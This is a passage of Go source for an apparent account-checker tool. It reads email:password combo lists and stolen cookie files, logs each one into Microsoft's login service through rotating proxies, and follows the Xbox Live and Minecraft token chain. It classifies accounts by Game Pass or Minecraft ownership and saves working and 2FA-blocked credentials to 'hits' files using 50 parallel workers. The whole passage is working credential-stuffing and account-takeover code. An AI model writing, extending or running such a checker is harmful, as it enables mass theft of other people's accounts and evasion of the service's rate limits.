		success, message, username, uuid, isDefinitive := checkerValidateCookies(cookieData, accountName, proxy, checkMinecraft)

		// If we got a definitive answer (valid or invalid), return it
		if isDefinitive {
			return success, message, username, uuid, attempt + 1
		}

		// If connection issue, wait a tiny bit then try another proxy
		time.Sleep(200 * time.Millisecond)
	}

	// All attempts failed or were inconclusive - try one more time with any proxy
	proxy := proxyList[rand.Intn(len(proxyList))]
	success, message, username, uuid, isDefinitive := checkerValidateCookies(cookieData, accountName, proxy, checkMinecraft)

	if isDefinitive {
		return success, message, username, uuid, 6
	}

	return false, "All proxies failed", "", "", 5
}

// checkerULPLoginURL mirrors MSMC's sFTTag_url used for the email:pass login flow.
const checkerULPLoginURL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

// checkerULPGetLoginTokens mirrors MSMC get_urlPost_sFTTag (single attempt):
// fetch the login page and pull the sFTTag (PPFT) flow token and urlPost target.
func checkerULPGetLoginTokens(client *http.Client) (urlPost, sFTTag string) {
	req, err := http.NewRequest("GET", checkerULPLoginURL, nil)
	if err != nil {
		return "", ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", ""
	}
	text := string(body)

	m := regexp.MustCompile(`(?s)value=\\"(.+?)\\"`).FindStringSubmatch(text)
	if len(m) == 0 {
		m = regexp.MustCompile(`(?s)value="(.+?)"`).FindStringSubmatch(text)
	}
	if len(m) == 0 {
		return "", ""
	}
	sFTTag = m[1]

	m = regexp.MustCompile(`(?s)"urlPost":"(.+?)"`).FindStringSubmatch(text)
	if len(m) == 0 {
		m = regexp.MustCompile(`(?s)urlPost:'(.+?)'`).FindStringSubmatch(text)
	}
	if len(m) > 0 {
		urlPost = m[1]
	}
	return urlPost, sFTTag
}

// checkerULPLogin mirrors MSMC get_xbox_rps (single attempt): POST the
// credentials and decide success / 2FA / bad / transient. Returns the access
// token on success and a status of "2fa" or "bad" for definitive failures.
func checkerULPLogin(client *http.Client, email, password, urlPost, sFTTag string) (token, status string) {
	form := url.Values{}
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("passwd", password)
	form.Set("PPFT", sFTTag)

	req, err := http.NewRequest("POST", urlPost, strings.NewReader(form.Encode()))
	if err != nil {
		return "", ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", ""
	}
	text := string(body)
	finalURL := resp.Request.URL.String()

	if strings.Contains(finalURL, "#") && finalURL != checkerULPLoginURL {
		if tok := checkerExtractAccessToken(finalURL, text); tok != "" {
			return tok, ""
		}
	}

	// MSMC cancel-recovery flow: extract ipt/pprid/uaid, hit the fmHF form
	// action, follow the recoveryCancel returnUrl, and look for a token.
	if strings.Contains(text, "cancel?mkt=") {
		ipt := regexp.MustCompile(`"ipt" value="(.+?)">`).FindStringSubmatch(text)
		pprid := regexp.MustCompile(`"pprid" value="(.+?)">`).FindStringSubmatch(text)
		uaid := regexp.MustCompile(`"uaid" value="(.+?)">`).FindStringSubmatch(text)
		fmHF := regexp.MustCompile(`id="fmHF" action="(.+?)"`).FindStringSubmatch(text)
		if len(ipt) > 0 && len(pprid) > 0 && len(uaid) > 0 && len(fmHF) > 0 {
			cancelForm := url.Values{}
			cancelForm.Set("ipt", ipt[1])
			cancelForm.Set("pprid", pprid[1])
			cancelForm.Set("uaid", uaid[1])
			if creq, err := http.NewRequest("POST", fmHF[1], strings.NewReader(cancelForm.Encode())); err == nil {
				creq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
				creq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				if cresp, err := client.Do(creq); err == nil {
					cbody, _ := io.ReadAll(cresp.Body)
					cresp.Body.Close()
					ret := regexp.MustCompile(`"recoveryCancel":{"returnUrl":"(.+?)"`).FindStringSubmatch(string(cbody))
					if len(ret) > 0 {
						if rreq, err := http.NewRequest("GET", ret[1], nil); err == nil {
							rreq.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
							if rresp, err := client.Do(rreq); err == nil {
								rbody, _ := io.ReadAll(rresp.Body)
								rresp.Body.Close()
								if tok := checkerExtractAccessToken(rresp.Request.URL.String(), string(rbody)); tok != "" {
									return tok, ""
								}
							}
						}
					}
				}
			}
		}
	}

	lower := strings.ToLower(text)
	for _, marker := range []string{"recover?mkt", "account.live.com/identity/confirm?mkt", "email/confirm?mkt", "/abuse?mkt="} {
		if strings.Contains(lower, marker) {
			return "", "2fa"
		}
	}
	for _, marker := range []string{"password is incorrect", "account doesn't exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"} {
		if strings.Contains(lower, marker) {
			return "", "bad"
		}
	}
	return "", ""
}

// checkerULPPostJSON posts a JSON payload on the shared ULP session.
func checkerULPPostJSON(client *http.Client, u string, payload map[string]interface{}, headers map[string]string) (*http.Response, map[string]interface{}, error) {
	buf, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", u, strings.NewReader(string(buf)))
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Content-Type", "application/json")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, nil, err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp, nil, err
	}
	var data map[string]interface{}
	if json.Unmarshal(body, &data) != nil {
		return resp, nil, errors.New("invalid json")
	}
	return resp, data, nil
}

// checkerULPGetJSON does a GET on the shared ULP session.
func checkerULPGetJSON(client *http.Client, u string, headers map[string]string) (*http.Response, string, error) {
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	return resp, string(body), err
}

// checkerValidateULP mirrors MSMC authenticate + checkmc: log in with
// email:pass, walk XBL -> XSTS -> Minecraft token, then classify the account
// via entitlements (Game Pass Ultimate / Game Pass / Minecraft / Other /
// Valid Mail). definitive=true means the verdict will not change on retry.
func checkerValidateULP(email, password, accountName, proxy string, checkMinecraft bool) (success bool, message, username, uuid string, mcValid bool, definitive bool) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return false, "Error", "", "", false, false
	}
	client := checkerHTTPClient(proxy)
	client.Jar = jar
	if tr, ok := client.Transport.(*http.Transport); ok && client.Transport != sharedTransport {
		defer tr.CloseIdleConnections()
	}

	urlPost, sFTTag := checkerULPGetLoginTokens(client)
	if urlPost == "" || sFTTag == "" {
		return false, "Login page failed", "", "", false, false
	}
	if strings.HasPrefix(urlPost, "/") {
		urlPost = "https://login.live.com" + urlPost
	}

	token, status := checkerULPLogin(client, email, password, urlPost, sFTTag)
	if token == "" {
		if status == "2fa" {
			return false, "INVALID: 2FA", "", "", false, true
		}
		if status == "bad" {
			return false, "INVALID: Bad login", "", "", false, true
		}
		return false, "Login failed", "", "", false, false
	}

	// XBL - mirrors MSMC authenticate
	xblResp, xblData, err := checkerULPPostJSON(client, "https://user.auth.xboxlive.com/user/authenticate", map[string]interface{}{
		"Properties": map[string]interface{}{
			"AuthMethod": "RPS",
			"SiteName":   "user.auth.xboxlive.com",
			"RpsTicket":  token,
		},
		"RelyingParty": "http://auth.xboxlive.com",
		"TokenType":    "JWT",
	}, map[string]string{"Accept": "application/json"})
	if err != nil {
		return false, "XBL failed", "", "", false, false
	}
	if xblResp.StatusCode != 200 {
		return false, "XBL failed", "", "", false, false
	}
	xblToken, _ := xblData["Token"].(string)
	if xblToken == "" {
		return true, "Valid Mail", "", "", false, true
	}
	userhash := ""
	if claims, ok := xblData["DisplayClaims"].(map[string]interface{}); ok {
		if xui, ok := claims["xui"].([]interface{}); ok && len(xui) > 0 {
			if entry, ok := xui[0].(map[string]interface{}); ok {
				if u, ok := entry["uhs"].(string); ok {
					userhash = u
				}
			}
		}
	}
	if userhash == "" {
		return true, "Valid Mail", "", "", false, true
	}

	// XSTS - mirrors MSMC authenticate (non-200 with no token => valid mail)
	xstsResp, xstsData, err := checkerULPPostJSON(client, "https://xsts.auth.xboxlive.com/xsts/authorize", map[string]interface{}{
		"Properties": map[string]interface{}{
			"SandboxId":  "RETAIL",
			"UserTokens": []string{xblToken},
		},
		"RelyingParty": "rp://api.minecraftservices.com/",
		"TokenType":    "JWT",
	}, map[string]string{"Accept": "application/json"})
	if err != nil {
		return false, "XSTS failed", "", "", false, false
	}
	xstsToken := ""
	if xstsResp.StatusCode == 200 {
		xstsToken, _ = xstsData["Token"].(string)
	}
	if xstsToken == "" {
		return true, "Valid Mail", "", "", false, true
	}

	// Minecraft token - mirrors MSMC mc_token (429 retries, no token => valid mail)
	mcToken := ""
	for {
		mcResp, mcData, merr := checkerULPPostJSON(client, "https://api.minecraftservices.com/authentication/login_with_xbox", map[string]interface{}{
			"identityToken": fmt.Sprintf("XBL3.0 x=%s;%s", userhash, xstsToken),
		}, map[string]string{"Content-Type": "application/json"})
		if merr != nil {
			return false, "MC token failed", "", "", false, false
		}
		if mcResp.StatusCode == 429 {
			return false, "Rate limited", "", "", false, false
		}
		if mcResp.StatusCode == 200 {
			mcToken, _ = mcData["access_token"].(string)
		}
		break
	}
	if mcToken == "" {
		return true, "Valid Mail", "", "", false, true
	}

	if !checkMinecraft {
		return true, "VALID: Microsoft", "Microsoft_User", "", false, true
	}

	// Entitlements - mirrors MSMC checkmc
	category := ""
	for {
		entResp, entBody, eerr := checkerULPGetJSON(client, "https://api.minecraftservices.com/entitlements/mcstore", map[string]string{"Authorization": "Bearer " + mcToken})
		if eerr != nil {
			return false, "Entitlements failed", "", "", false, false
		}
		if entResp.StatusCode == 429 {
			return false, "Rate limited", "", "", false, false
		}
		if entResp.StatusCode != 200 {
			return true, "Valid Mail", "", "", false, true
		}
		switch {
		case strings.Contains(entBody, "product_game_pass_ultimate"):
			category = "Xbox Game Pass Ultimate"
		case strings.Contains(entBody, "product_game_pass_pc"):
			category = "Xbox Game Pass"
		case strings.Contains(entBody, `"product_minecraft"`):
			category = "Minecraft"
		default:
			var others []string
			if strings.Contains(entBody, "product_minecraft_bedrock") {
				others = append(others, "Minecraft Bedrock")
			}
			if strings.Contains(entBody, "product_legends") {
				others = append(others, "Minecraft Legends")
			}
			if strings.Contains(entBody, "product_dungeons") {
				others = append(others, "Minecraft Dungeons")
			}
			if len(others) > 0 {
				category = "Other - " + strings.Join(others, ", ")
			}
		}
		break
	}

	if category == "" {
		return true, "Valid Mail", "", "", false, true
	}

	// Profile - mirrors MSMC capture_mc (best effort for the account name)
	profResp, profBody, perr := checkerULPGetJSON(client, "https://api.minecraftservices.com/minecraft/profile", map[string]string{"Authorization": "Bearer " + mcToken})
	if perr != nil {
		return true, "VALID: " + category, "", "", true, true
	}
	if profResp.StatusCode == 200 {
		var profData map[string]interface{}
		if json.Unmarshal([]byte(profBody), &profData) == nil {
			uname, _ := profData["name"].(string)
			uid, _ := profData["id"].(string)
			if uname != "" {
				return true, "VALID: " + category + " | " + uname, uname, uid, true, true
			}
		}
	}
	return true, "VALID: " + category, "", "", true, true
}

// checkerCheckULPWithFullRetry mirrors checkerCheckAccountWithFullRetry for the
// email:pass flow: up to 5 proxy attempts before giving up.
func checkerCheckULPWithFullRetry(email, password, accountName string, proxyList []string, checkMinecraft bool) (success bool, message, username, uuid string, mcValid bool, attempts int) {
	usedProxies := make(map[string]bool)

	for attempt := 0; attempt < 5; attempt++ {
		var available []string
		for _, p := range proxyList {
			if !usedProxies[p] {
				available = append(available, p)
			}
		}
		if len(available) == 0 {
			break
		}

		proxy := available[rand.Intn(len(available))]
		usedProxies[proxy] = true

		success, message, username, uuid, mcValid, isDefinitive := checkerValidateULP(email, password, accountName, proxy, checkMinecraft)

		if isDefinitive {
			return success, message, username, uuid, mcValid, attempt + 1
		}

		time.Sleep(200 * time.Millisecond)
	}

	proxy := proxyList[rand.Intn(len(proxyList))]
	success, message, username, uuid, mcValid, isDefinitive := checkerValidateULP(email, password, accountName, proxy, checkMinecraft)

	if isDefinitive {
		return success, message, username, uuid, mcValid, 6
	}

	return false, "All proxies failed", "", "", false, 5
}

func appendLine(path, line string) {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(line + "\n")
}

func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0644)
}

func handleRunChecker(w http.ResponseWriter, r *http.Request) {
	defer func() {
		if rec := recover(); rec != nil {
			appLog("PANIC in handleRunChecker: %v", rec)
			writeSSE(w, ProgressEvent{Type: "error", Message: fmt.Sprintf("internal error: %v", rec)})
		}
	}()

	dir := r.URL.Query().Get("dir")
	mode := r.URL.Query().Get("mode")
	isULP := mode == "ulp"
	checkMS := r.URL.Query().Get("microsoft") == "true"
	checkMC := r.URL.Query().Get("minecraft") == "true"
	validateEnabled := checkMS || checkMC

	if dir == "" {
		writeSSE(w, ProgressEvent{Type: "error", Message: "missing dir parameter"})
		return
	}
	info, err := os.Stat(dir)
	if err != nil || !info.IsDir() {
		writeSSE(w, ProgressEvent{Type: "error", Message: "invalid directory"})
		return
	}

	proxyPath := r.URL.Query().Get("proxy")
	if proxyPath == "" {
		cfgMu.RLock()
		proxyPath = cfg.ProxyFile
		cfgMu.RUnlock()
	}
	if proxyPath == "" {
		proxyPath = proxiesPath
	}

	var proxyList []string
	if validateEnabled {
		if err := loadProxies(proxyPath); err != nil {
			writeSSE(w, ProgressEvent{Type: "error", Message: "failed to load proxies: " + err.Error()})
			return
		}
		proxiesMu.Lock()
		proxyList = append([]string{}, proxies...)
		proxiesMu.Unlock()
		var normalized []string
		for _, p := range proxyList {
			if strings.Contains(p, "://") {
				normalized = append(normalized, p)
				continue
			}
			if u := buildProxyURL(p, "http"); u != "" {
				normalized = append(normalized, u)
			}
		}
		proxyList = normalized
		if len(proxyList) == 0 {
			writeSSE(w, ProgressEvent{Type: "error", Message: "no proxies available in " + proxyPath})
			return
		}
		appLog("CHECKER RUN - using %d proxies from %s", len(proxyList), proxyPath)
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	flusher, _ := w.(http.Flusher)

	now := time.Now()
	timestamp := now.Format("20060102_150405")

	profilesRunDir := filepath.Join(profilesDir, "run_"+timestamp)
	resRunDir := filepath.Join(resDir, "run_"+timestamp)
	resValidMSDir := filepath.Join(resRunDir, "valid_microsoft")
	resValidMCDir := filepath.Join(resRunDir, "valid_minecraft")
	os.MkdirAll(resRunDir, 0755)

	// Optional flat hits dump (see handleConvertRun).
	resHitsDir := filepath.Join(resRunDir, "hits")
	if d := hitsOutputDirSetting(); d != "" {
		os.MkdirAll(d, 0755)
		resHitsDir = d
	} else {
		os.MkdirAll(resHitsDir, 0755)
	}
	if validateEnabled {
		os.MkdirAll(resValidMSDir, 0755)
		if checkMC {
			os.MkdirAll(resValidMCDir, 0755)
		}
	}

	appLog("CHECKER RUN START - directory: %s, mode: %s, microsoft: %v, minecraft: %v", dir, mode, checkMS, checkMC)

	// Step 1: Sorting (no validation yet) - filter invalid formats, remove
	// duplicates, sort; save the original sorted list to hits/
	var files []string
	filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if strings.Contains(d.Name(), "valid_accounts_summary") {
			return nil
		}
		files = append(files, path)
		return nil
	})
	sort.Strings(files)

	invalidCount := 0
	dupCount := 0
	unparsedCount := 0
	seen := make(map[string]struct{})
	var savedHits []string

	type ulpAccount struct {
		email, pass, src string
	}
	var ulpAccounts []ulpAccount

	if isULP {
		for _, path := range files {
			finfo, serr := os.Stat(path)
			if serr != nil || finfo.Size() > MaxCookieFileSize {
				invalidCount++
				continue
			}
			data, rerr := os.ReadFile(path)
			if rerr != nil {
				invalidCount++
				continue
			}
			var lines []string
			for _, l := range strings.Split(strings.ReplaceAll(string(data), "\r\n", "\n"), "\n") {
				l = strings.TrimSpace(l)
				if l == "" {
					continue
				}
				parts := strings.SplitN(l, ":", 2)
				email := ""
				pass := ""
				if len(parts) == 2 {
					email = strings.TrimSpace(parts[0])
					pass = strings.TrimSpace(parts[1])
				}
				if email == "" || pass == "" {
					unparsedCount++
					continue
				}
				key := strings.ToLower(email) + ":" + pass
				if _, dup := seen[key]; dup {
					dupCount++
					continue
				}
				seen[key] = struct{}{}
				lines = append(lines, email+":"+pass)
				ulpAccounts = append(ulpAccounts, ulpAccount{email, pass, path})
			}
			if len(lines) == 0 {
				continue
			}
			rel, _ := filepath.Rel(dir, path)
			flat := strings.ReplaceAll(rel, " ", "_")
			flat = strings.ReplaceAll(flat, "/", "_")
			flat = strings.ReplaceAll(flat, "\\", "_")
			if flat == "." || flat == "" {
				flat = fmt.Sprintf("file_%d", len(savedHits))
			}
			dst := filepath.Join(resHitsDir, flat)
			if werr := os.WriteFile(dst, []byte(strings.Join(lines, "\n")+"\n"), 0644); werr != nil {
				continue
			}
			savedHits = append(savedHits, dst)
		}
		appLog("CHECKER ULP SORT - found: %d, invalid: %d, duplicates: %d, unparsed: %d, hits: %d", len(files), invalidCount, dupCount, unparsedCount, len(ulpAccounts))
		safeSSEWithContext(r.Context(), w, flusher, ProgressEvent{
			Type: "progress", Processed: 0, Total: len(ulpAccounts), Percent: 0,
			CheckStatus: fmt.Sprintf("Step 1 done - sorted %d accounts into hits (unparsed: %d, duplicates: %d)", len(ulpAccounts), unparsedCount, dupCount),
		})
	} else {
		for _, path := range files {
			finfo, serr := os.Stat(path)
			if serr != nil || finfo.Size() > MaxCookieFileSize {
				invalidCount++
				continue
			}
			data, rerr := os.ReadFile(path)
			if rerr != nil {
				invalidCount++
				continue
			}
			if len(checkerParseCookies(string(data))) == 0 {
				invalidCount++
				continue
			}
			var norm []string
			for _, l := range strings.Split(strings.TrimSpace(string(data)), "\n") {
				l = strings.TrimSpace(l)
				if l != "" {
					norm = append(norm, l)
				}
			}
			key := strings.Join(norm, "\n")
			if _, dup := seen[key]; dup {
				dupCount++
				continue
			}
			seen[key] = struct{}{}
			rel, _ := filepath.Rel(dir, path)
			flat := strings.ReplaceAll(rel, " ", "_")
			flat = strings.ReplaceAll(flat, "/", "_")
			flat = strings.ReplaceAll(flat, "\\", "_")
			if flat == "." || flat == "" {
				flat = fmt.Sprintf("file_%d", len(savedHits))
			}
			dst := filepath.Join(resHitsDir, flat)
			if werr := os.WriteFile(dst, data, 0644); werr != nil {
				continue
			}
			savedHits = append(savedHits, dst)
		}
		appLog("CHECKER SORT - found: %d, invalid: %d, duplicates: %d, hits: %d", len(files), invalidCount, dupCount, len(savedHits))
		safeSSEWithContext(r.Context(), w, flusher, ProgressEvent{
			Type: "progress", Processed: 0, Total: len(savedHits), Percent: 0,
			CheckStatus: fmt.Sprintf("Step 1 done - sorted %d accounts into hits (invalid: %d, duplicates: %d)", len(savedHits), invalidCount, dupCount),
		})
	}

	if !validateEnabled {
		safeSSEWithContext(r.Context(), w, flusher, ProgressEvent{
			Type: "progress", Processed: len(savedHits), Total: len(savedHits), Percent: 100,
			CheckStatus: "Validation skipped - no validator toggles selected",
		})
	}

	// Step 2: Validation using the copied checker
	var validMS int64
	var validMC int64
	type checkerOutcome struct {
		name     string
		msOK     bool
		msMsg    string
		msUser   string
		mcOK     bool
		mcMsg    string
		mcUser   string
		mcUUID   string
		attempts int
	}

	total := len(savedHits)
	if isULP {
		total = len(ulpAccounts)
	}
	if validateEnabled && total > 0 {
		if isULP {
			workers := 50
			if total < workers {
				workers = total
			}
			workCh := make(chan ulpAccount)
			resultCh := make(chan checkerOutcome, total)
			var wg sync.WaitGroup
			for i := 0; i < workers; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for acc := range workCh {
						oc := checkerOutcome{name: acc.email}
						oc.msOK, oc.msMsg, oc.msUser, _, oc.mcOK, oc.attempts = checkerCheckULPWithFullRetry(acc.email, acc.pass, acc.email, proxyList, checkMC)
						if oc.msOK {
							atomic.AddInt64(&validMS, 1)
							appendLine(filepath.Join(resValidMSDir, "valid_microsoft.txt"), acc.email+":"+acc.pass)
							if oc.mcOK {
								atomic.AddInt64(&validMC, 1)
								appendLine(filepath.Join(resValidMCDir, "valid_minecraft.txt"), acc.email+":"+acc.pass)
							}
						} else if strings.Contains(oc.msMsg, "2FA") {
							appendLine(filepath.Join(resRunDir, "2fa.txt"), acc.email+":"+acc.pass)
						}
						resultCh <- oc
					}
				}()
			}
			go func() {
				defer close(workCh)
				for _, acc := range ulpAccounts {
					select {
					case <-r.Context().Done():
						return
					case workCh <- acc:
					}
				}
			}()
			go func() {
				defer close(resultCh)
				wg.Wait()
			}()

			processed := 0
			for oc := range resultCh {
				processed++
				vMS := int(atomic.LoadInt64(&validMS))
				vMC := int(atomic.LoadInt64(&validMC))
				safeSSEWithContext(r.Context(), w, flusher, ProgressEvent{
					Type: "progress", Processed: processed, Total: total,
					Valid: vMS, Invalid: processed - vMS, MinecraftValid: vMC,
					Checked: processed, CheckTotal: total,
					Percent: float64(processed) / float64(total) * 100,
					CheckStatus: fmt.Sprintf("[%d/%d] %s - %s (attempts: %d)", processed, total, oc.name, oc.msMsg, oc.attempts),
				})
			}
		} else {
			workers := 50
			if total < workers {
				workers = total
			}
			workCh := make(chan string)
			resultCh := make(chan checkerOutcome, total)
			var wg sync.WaitGroup
			for i := 0; i < workers; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					for path := range workCh {
						data, rerr := os.ReadFile(path)
						if rerr != nil {
							continue
						}
						name := filepath.Base(path)
						oc := checkerOutcome{name: name}
						oc.msOK, oc.msMsg, oc.msUser, _, oc.attempts = checkerCheckAccountWithFullRetry(string(data), name, proxyList, false)
						if oc.msOK {
							atomic.AddInt64(&validMS, 1)
							copyFile(path, filepath.Join(resValidMSDir, name))
							if checkMC {
								oc.mcOK, oc.mcMsg, oc.mcUser, oc.mcUUID, _ = checkerCheckAccountWithFullRetry(string(data), name, proxyList, true)
								if oc.mcOK {
									atomic.AddInt64(&validMC, 1)
									copyFile(path, filepath.Join(resValidMCDir, name))
								}
							}
						}
						resultCh <- oc
					}
				}()
			}
			go func() {
				defer close(workCh)
				for _, p := range savedHits {
					select {
					case <-r.Context().Done():
						return
					case workCh <- p:
					}
				}
			}()
			go func() {
				defer close(resultCh)
				wg.Wait()
			}()

			processed := 0
			for oc := range resultCh {
				processed++
				msg := oc.msMsg
				if oc.mcOK {
					msg = oc.mcMsg
				}
				vMS := int(atomic.LoadInt64(&validMS))
				vMC := int(atomic.LoadInt64(&validMC))
				safeSSEWithContext(r.Context(), w, flusher, ProgressEvent{
					Type: "progress", Processed: processed, Total: total,
					Valid: vMS, Invalid: processed - vMS, MinecraftValid: vMC,
					Checked: processed, CheckTotal: total,
					Percent: float64(processed) / float64(total) * 100,
					CheckStatus: fmt.Sprintf("[%d/%d] %s - %s (attempts: %d)", processed, total, oc.name, msg, oc.attempts),
				})
			}
		}
	}

	elapsed := time.Since(now).Seconds()
	finalMS := int(atomic.LoadInt64(&validMS))
	finalMC := int(atomic.LoadInt64(&validMC))
	summary := Summary{
		RunID:          timestamp,
		Timestamp:      now.Format(time.RFC3339),
		FilesScanned:   len(files),
		TotalCookies:   total,
		CheckedCookies: finalMS,
		ValidCookies:   finalMS,
		InvalidCookies: total - finalMS,
		ValidMicrosoft: finalMS,
		ValidMinecraft: finalMC,
		Errors:          invalidCount,
		ElapsedSeconds:  elapsed,
		SourceDirectory: dir,
		OutputDir:       resRunDir,
		ProfilesDir:     profilesDir,
	}

	sumData, _ := json.MarshalIndent(summary, "", "  ")
	os.WriteFile(filepath.Join(resRunDir, "summary.json"), sumData, 0644)
	os.WriteFile(filepath.Join(profilesRunDir, "summary.json"), sumData, 0644)

	cfgMu.Lock()
	cfg.LastRun = summary.RunID
	saveConfig(cfg)
	cfgMu.Unlock()

	appLog("CHECKER RUN COMPLETE - files: %d, hits: %d, valid ms: %d, valid mc: %d, invalid: %d, time: %.1fs",
		len(files), total, finalMS, finalMC, total-finalMS, elapsed)

	if r.Context().Err() != nil {
		appLog("SSE SKIP - client disconnected before completion")
		return
	}

	safeSSE(w, flusher, ProgressEvent{
		Type:            "complete",
		RunID:           summary.RunID,
		FilesScanned:    summary.FilesScanned,
		TotalCookies:    summary.TotalCookies,
		TotalHits:       summary.TotalCookies,
		Checked:         summary.CheckedCookies,
		Valid:           summary.ValidCookies,
		Invalid:         summary.InvalidCookies,
		MinecraftValid:  summary.ValidMinecraft,
		Errors:          summary.Errors,
		ElapsedSeconds:  summary.ElapsedSeconds,
		OutputDir:       summary.OutputDir,
		Unparsed:        unparsedCount,
		DomainBreakdown: summary.DomainBreakdown,
	})
}

func handleSortMode(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var req struct {
			SortMode string `json:"sort_mode"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		if req.SortMode != "cookie" && req.SortMode != "ulp" {
			http.Error(w, "invalid sort mode", 400)
			return
		}
		cfgMu.Lock()
		cfg.SortMode = req.SortMode
		saveConfig(cfg)
		cfgMu.Unlock()
		writeJSON(w, map[string]string{"status": "ok"})
		return
	}
	handleConfig(w, r)
}

// handleUpdateOutputDir saves the optional flat hits dump folder
// (POST /api/config/outputdir {"hits_output_dir": "..."}).
func handleUpdateOutputDir(w http.ResponseWriter, r *http.Request) {
	var req struct {
		HitsOutputDir string `json:"hits_output_dir"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid JSON", 400)
		return
	}
	cfgMu.Lock()
	cfg.HitsOutputDir = strings.TrimSpace(req.HitsOutputDir)
	saveConfig(cfg)
	cfgMu.Unlock()
	writeJSON(w, map[string]string{"status": "ok"})
}

func handleProxyConfig(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		var req struct {
			ProxyMode string `json:"proxy_mode"`
			ProxyFile string `json:"proxy_file"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid JSON", 400)
			return
		}
		switch req.ProxyMode {
		case "", "off", "http", "socks4", "socks5":
		default:
			http.Error(w, "invalid proxy mode", 400)
			return
		}
		if req.ProxyMode == "" {
			req.ProxyMode = "off"
		}
		cfgMu.Lock()
		cfg.ProxyMode = req.ProxyMode
		if req.ProxyFile != "" {
			cfg.ProxyFile = req.ProxyFile
			loadProxies(req.ProxyFile)
		} else if req.ProxyMode != "off" && cfg.ProxyFile != "" {
			loadProxies(cfg.ProxyFile)
		}
		saveConfig(cfg)
		cfgMu.Unlock()
		writeJSON(w, map[string]string{"status": "ok"})
		return
	}
	handleConfig(w, r)
}

func handleProxyUpload(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseMultipartForm(64 << 20); err != nil {
		http.Error(w, "failed to parse upload: "+err.Error(), 400)
		return
	}
	fh, _, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "no file provided", 400)
		return
	}
	defer fh.Close()
	data, err := io.ReadAll(fh)
	if err != nil {
		http.Error(w, "failed to read file", 400)
		return
	}
	if err := os.WriteFile(uploadedProxiesPath, data, 0644); err != nil {
		http.Error(w, "failed to save file", 500)
		return
	}
	cfgMu.Lock()
	cfg.ProxyFile = uploadedProxiesPath
	saveConfig(cfg)
	cfgMu.Unlock()
	if err := loadProxies(uploadedProxiesPath); err != nil {
		http.Error(w, "saved but failed to load proxies: "+err.Error(), 400)
		return
	}
	proxiesMu.Lock()
	count := len(proxies)
	proxiesMu.Unlock()
	appLog("PROXY UPLOAD - saved %s (%d proxies)", filepath.Base(uploadedProxiesPath), count)
	writeJSON(w, map[string]interface{}{
		"status": "ok",
		"file":   filepath.Base(uploadedProxiesPath),
		"count":  count,
	})
}

// === CONVERTER HANDLERS ===

type ConvertEvent struct {
	Type       string  `json:"type"`
	Total      int     `json:"total,omitempty"`
	Parsed     int     `json:"parsed,omitempty"`
	Duplicate  int     `json:"duplicate,omitempty"`
	Unparsed   int     `json:"unparsed,omitempty"`
	Processed  int     `json:"processed,omitempty"`
	Success    int     `json:"success,omitempty"`
	Failed     int     `json:"failed,omitempty"`
	MFA        int     `json:"mfa,omitempty"`
	Invalid    int     `json:"invalid,omitempty"`
	Locked     int     `json:"locked,omitempty"`
	Captcha    int     `json:"captcha,omitempty"`
	Skipped    int     `json:"skipped,omitempty"`
	Current    string  `json:"current,omitempty"`
	RatePerMin float64 `json:"rate_per_min,omitempty"`
	ETA        int64   `json:"eta_seconds,omitempty"`
	OutDir     string  `json:"out_dir,omitempty"`
	CSVPath    string  `json:"csv_path,omitempty"`
	FailPath   string  `json:"fail_path,omitempty"`
	DryRun     bool    `json:"dry_run,omitempty"`
	Message    string  `json:"message,omitempty"`
}

